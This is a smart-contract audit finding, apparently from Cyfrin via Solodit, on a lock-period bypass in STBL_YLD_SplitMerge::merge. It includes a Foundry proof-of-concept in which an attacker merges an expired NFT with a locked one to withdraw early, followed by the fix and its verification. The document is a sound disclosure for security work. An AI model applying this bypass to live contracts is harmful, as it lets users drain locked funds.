---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-06-17-cyfrin-stbl-ess-v2-0-2-5
ingested_at: '2026-08-09T05:32:30Z'
protocol_category: []
published_at: '2026-06-17T00:00:00Z'
related_swc: []
severity: Medium
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md
tags:
- firm:cyfrin
- report:2026-06-17-cyfrin-stbl-ess-v2-0
title: '`STBL_YLD_SplitMerge::merge` assigns oldest `depositTimestamp` to merged NFT,
  bypassing lock period of newly deposited assets'
vuln_class: []
---

# `STBL_YLD_SplitMerge::merge` assigns oldest `depositTimestamp` to merged NFT, bypassing lock period of newly deposited assets

_Section severity (from Solodit section header): Medium_  
_Audit firm: Cyfrin_  
_Source report: [2026-06-17-cyfrin-stbl-ess-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md)_

---

**Description:** `STBL_YLD_SplitMerge::merge` combines two YLD NFTs into a single new one. When building the merged NFT's metadata, it sets `depositTimestamp` to the minimum (oldest) of the two originals:

```solidity
depositTimestamp: metaA.depositTimestamp < metaB.depositTimestamp
    ? metaA.depositTimestamp
    : metaB.depositTimestamp,
// ...
```

Every issuer enforces a withdrawal lock using the stored metadata: `(MetaData.depositTimestamp + MetaData.Fees.yieldDuration) > block.timestamp`. Because the merged NFT carries the oldest `depositTimestamp`, its effective lock expiry is `oldTimestamp + currentYieldDuration`. If the older NFT's lock has already expired — i.e., `oldTimestamp + yieldDuration < now` — the merged NFT's lock is also expired at the moment of minting, regardless of how recently the newer NFT was deposited.

**Impact:** Any user who holds one old lock-expired YLD NFT and one newly deposited YLD NFT for the same asset can merge them, then immediately call `issuer::withdraw` on the merged NFT, bypassing the remaining lock on the new deposit. The old expired NFT acts as a reusable key: after merging and withdrawing, the user can split off a small value piece carrying the old timestamp and reuse it for future bypasses. Additionally, the redemption pool amplifies this issue: `iDeposit` always merges incoming LP NFTs into the single pool NFT, which accumulates the oldest timestamp across all historical deposits. Once the pool is older than `yieldDuration`, any LP who deposits and immediately withdraws receives a split piece with the pool's old timestamp, making the lock check pass instantly against the issuer.

Direct bypass (two-NFT path):
1. User holds `NFT_old` with `depositTimestamp = T_old` where `T_old + yieldDuration < now` (lock expired).
2. User deposits a new position, receiving `NFT_new` with `depositTimestamp = now` (lock active for full `yieldDuration`).
3. User calls `merge(NFT_old, NFT_new)` → merged NFT gets `depositTimestamp = T_old`, `Fees.yieldDuration` fresh from registry.
4. Lock check: `(T_old + yieldDuration) > now` → false (already expired) → `issuer::withdraw` succeeds immediately.

Redemption pool path (systemic variant):

1. Pool NFT has accumulated the oldest timestamp `T_pool` from all prior deposits.
2. Once `T_pool + yieldDuration < now`, the pool NFT's lock is expired.
3. New LP deposits `NFT_new` → `iDeposit` merges it into the pool NFT → pool keeps `T_pool`.
4. LP immediately calls `withdraw` → receives split piece B with `depositTimestamp = T_pool`.
5. LP calls `issuer.withdraw(pieceB)` → lock check passes → assets exit the system.


**Proof of Concept:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * @title  MergeTimestampBypass_PoC
 * @notice PoC: lock period of newly deposited NFT bypassed by merging with older lock-expired NFT
 * @dev    Title:    STBL_YLD_SplitMerge.merge() assigns oldest depositTimestamp, bypassing lock on new deposits
 *         Affected: stbl-contracts-evm-redemptions/contracts/splitter/STBL_YLD_SplitMerge.sol:186-207
 *         Impact:   Attacker withdraws newly locked assets immediately via merge with expired NFT
 *         Author:   0xStalin
 *
 * Run: forge test --match-test test_poc_mergeBypassesLockPeriod -vvv
 */

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Helper} from "./helper.t.sol";

import {STBL_YLD_SplitMerge} from "../contracts/splitter/STBL_YLD_SplitMerge.sol";

import {STBL_PT1_Issuer} from "@stbl-protocol/stbl-contracts-evm-asset-type1/contracts/issuers/STBL_PT1_Issuer.sol";
import {STBL_TestToken} from "@stbl-protocol/stbl-contracts-evm-asset-type1/contracts/test/STBL_TestToken.sol";
import {STBL_T1_Vault} from "@stbl-protocol/stbl-contracts-evm-asset-type1/contracts/vault/STBL_T1_Vault.sol";
import {STBL_Asset_WithdrawDurationNotReached} from "@stbl-protocol/stbl-contracts-evm-asset-type1/contracts/lib/STBL_Asset_Errors.sol";

import "@stbl-protocol/stbl-contracts-evm-core/contracts/lib/STBL_Structs.sol";

// ─────────────────────────────────────────────────────────────────────────────
//  PoC Test Suite
// ─────────────────────────────────────────────────────────────────────────────
contract MergeTimestampBypass_PoC is Helper {
    // ── Contracts under test ─────────────────────────────────────────────
    STBL_YLD_SplitMerge public splitMerge;

    // ── Single asset (slot index 1) ──────────────────────────────────────
    uint256 constant ASSET_SLOT = 1;
    uint256 public assetRegID;

    uint256 constant DEPOSIT = 10_000 * 1e18;

    // ─────────────────────────────────────────────────────────────────────
    //  setUp
    // ─────────────────────────────────────────────────────────────────────
    function setUp() public override {
        super.setUp(); // deploys core: USST, YLD, Registry, Core

        // Deploy one PT1 asset
        deployAsset(ASSET_SLOT, AssetType.PT1);
        assetRegID = getAssetRegistryId(ASSET_SLOT);

        // Fund user1 (attacker) with underlying asset tokens
        vm.startPrank(admin);
        STBL_TestToken(getAssetToken(ASSET_SLOT)).mint(user1);
        STBL_TestToken(getAssetToken(ASSET_SLOT)).mint(user1);

        // Deploy SplitMerge, grant MINTER_ROLE on YLD and SPLITTER_ROLE on registry
        splitMerge = new STBL_YLD_SplitMerge(address(registry));
        yld.grantRole(yld.MINTER_ROLE(), address(splitMerge));
        registry.grantRole(keccak256("SPLITTER_ROLE"), address(splitMerge));
        vm.stopPrank();
    }

    // ─────────────────────────────────────────────────────────────────────
    //  Helper: issue a YLD NFT by depositing underlying tokens via PT1 Issuer
    // ─────────────────────────────────────────────────────────────────────
    function _issueNFT(address _user, uint256 _amount) internal returns (uint256 nftId) {
        vm.startPrank(_user);
        STBL_TestToken(getAssetToken(ASSET_SLOT)).approve(getAssetVault(ASSET_SLOT), _amount);
        nftId = STBL_PT1_Issuer(getAssetIssuer(ASSET_SLOT)).deposit(_amount);
        vm.stopPrank();
    }

    // ─────────────────────────────────────────────────────────────────────
    //  PoC: merge() inherits oldest depositTimestamp, bypassing new lock
    // ─────────────────────────────────────────────────────────────────────
    function test_poc_mergeBypassesLockPeriod() public {
        address attacker = user1;

        // == [ Setup ] ==

        // Record attacker token balance before any deposit
        uint256 tokenBalanceBefore = STBL_TestToken(getAssetToken(ASSET_SLOT)).balanceOf(attacker);

        // == [ Age First NFT ] ==

        // Step 1: Attacker deposits DEPOSIT tokens at time T0, receives nftOld
        uint256 T0 = block.timestamp;
        uint256 nftOld = _issueNFT(attacker, DEPOSIT);

        // Step 2: Advance time past the yieldDuration lock -- nftOld lock is now expired
        // yieldDuration = 10_000_000; warp by 10_000_001 so T0 + yieldDuration < now
        vm.warp(T0 + 10_000_001);
        vm.roll(block.number + 1);

        YLD_Metadata memory metaOld = yld.getNFTData(nftOld);

        // == [ Create Newly Locked NFT ] ==

        // Step 3: Attacker deposits DEPOSIT tokens again at T0 + 10_000_001, receives nftNew
        // nftNew lock expires at: (T0 + 10_000_001) + 10_000_000 = T0 + 20_000_001
        uint256 nftNew = _issueNFT(attacker, DEPOSIT);
        YLD_Metadata memory metaNew = yld.getNFTData(nftNew);

        uint256 newLockExpiry = metaNew.depositTimestamp + metaNew.Fees.yieldDuration;

        console.log("--- Pre-Exploit State ---");
        console.log("nftOld depositTimestamp:", metaOld.depositTimestamp);
        console.log("nftNew depositTimestamp:", metaNew.depositTimestamp);
        console.log("nftNew expected lock expiry (depositTimestamp + yieldDuration):", newLockExpiry);
        console.log("Current timestamp:", block.timestamp);

        // == [ Confirm Lock Active ] ==

        // Step 4: Sanity check -- confirm nftNew is still locked (direct withdrawal must revert)
        vm.expectRevert(
            abi.encodeWithSelector(
                STBL_Asset_WithdrawDurationNotReached.selector,
                assetRegID,
                nftNew
            )
        );
        vm.prank(attacker);
        STBL_PT1_Issuer(getAssetIssuer(ASSET_SLOT)).withdraw(nftNew);

        // == [ Execute Exploit ] ==

        // Step 5: Attacker merges nftOld (lock expired) with nftNew (lock active).
        // merge() sets mergedNFT.depositTimestamp = min(T0, T0 + 10_000_001) = T0.
        // Fees are regenerated fresh from registry: yieldDuration = 10_000_000.
        // Merged lock expiry = T0 + 10_000_000.
        // Current time = T0 + 10_000_001 > T0 + 10_000_000 => lock already expired.
        // merged lock expiry = T0 + 10_000_000, which is 1 second before now (T0 + 10_000_001) -- already expired
        vm.startPrank(attacker);
        yld.setApprovalForAll(address(splitMerge), true);
        uint256 mergedNFT = splitMerge.merge(nftOld, nftNew);
        vm.stopPrank();

        YLD_Metadata memory metaMerged = yld.getNFTData(mergedNFT);

        // Step 6: Attacker immediately withdraws the merged NFT -- must succeed.
        // The PT1 issuer calls STBL_Core.exit() which calls USST.burn(_from, _value).
        // USST.burn() does safeTransferFrom(_from, address(this), _amt), so the attacker
        // must pre-approve the USST contract to pull their USST balance.
        vm.startPrank(attacker);
        uint256 attackerUSST = usst.balanceOf(attacker);
        usst.approve(address(usst), attackerUSST);
        STBL_PT1_Issuer(getAssetIssuer(ASSET_SLOT)).withdraw(mergedNFT);
        vm.stopPrank();

        // == [ Verify Impact ] ==

        uint256 tokenBalanceAfter = STBL_TestToken(getAssetToken(ASSET_SLOT)).balanceOf(attacker);

        // Seconds remaining on nftNew's original lock at the moment of withdrawal
        uint256 lockRemaining = newLockExpiry - block.timestamp;

        console.log("--- Post-Exploit State ---");
        console.log("Attacker underlying balance before deposits:", tokenBalanceBefore);
        console.log("Attacker underlying tokens recovered after fees:", tokenBalanceAfter);
        console.log("Seconds remaining on nftNew lock at time of withdrawal:", lockRemaining);
        console.log("Merged NFT depositTimestamp:", metaMerged.depositTimestamp);
        console.log("Merged NFT yieldDuration:", metaMerged.Fees.yieldDuration);

        // Attacker recovered tokens despite nftNew being mid-lock
        assertGt(
            tokenBalanceAfter,
            0,
            "exploit: attacker must recover tokens despite nftNew lock being active"
        );

        // Fees were deducted -- attacker did not recover more than deposited
        assertLt(
            tokenBalanceAfter,
            tokenBalanceBefore,
            "exploit: recovery is net of fees (less than original deposits)"
        );

        // The merged NFT used nftOld's older depositTimestamp, not nftNew's
        assertEq(
            metaMerged.depositTimestamp,
            metaOld.depositTimestamp,
            "exploit: merged NFT inherits oldest depositTimestamp from nftOld"
        );

        // nftNew's lock had meaningful time remaining -- confirm the bypass was significant
        assertGt(
            lockRemaining,
            0,
            "exploit: nftNew lock was still active at time of merged withdrawal"
        );

        console.log("[+] CONFIRMED: attacker withdrew both deposits while nftNew lock was still active");
        console.log("[+] Lock remaining on nftNew at withdrawal time (seconds):", lockRemaining);
    }
}
```

**Recommended Mitigation:** Use the newer (larger) `depositTimestamp` rather than the older (smaller) one when building the merged NFT, so that the merged position is subject to the full remaining lock of the most recently added component.

**STBL**
Fixed in commits [9315f68](https://github.com/USD-Pi-Protocol/stbl-contracts-evm-ess-common/commit/9315f68b79442e96f16d7ffc764c184d7a1f46a1) && [fea8a87](https://github.com/USD-Pi-Protocol/stbl-contracts-evm-redemptions/commit/fea8a875f384a7be90b5911678ff29ffae095a29).

**Cyfrin:** Verified. `STBL_YLD_SplitMerge` now assign the newer (larger) `depositTimestamp` to the merged NFT, ensuring the merged position is subject to the most restrictive remaining lock of its two inputs
